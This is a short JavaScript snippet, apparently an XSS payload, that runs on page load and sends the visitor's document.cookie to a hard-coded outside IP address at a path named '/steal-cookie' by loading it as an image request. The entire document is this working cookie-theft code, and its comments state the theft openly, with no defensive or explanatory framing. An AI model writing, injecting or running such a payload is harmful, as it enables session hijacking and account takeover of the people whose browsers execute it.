// Send the cookie to your server every time the page is refreshed or loaded
(function() {
    // Create an image element to send the cookie as a GET request
    var img = new Image();
    img.src = "http://157.245.55.193:8001/steal-cookie?cookie=" + document.cookie;

    // Optionally, log the cookie in the browser console (for testing purposes)
    console.log("Sending cookie: " + document.cookie);
})();
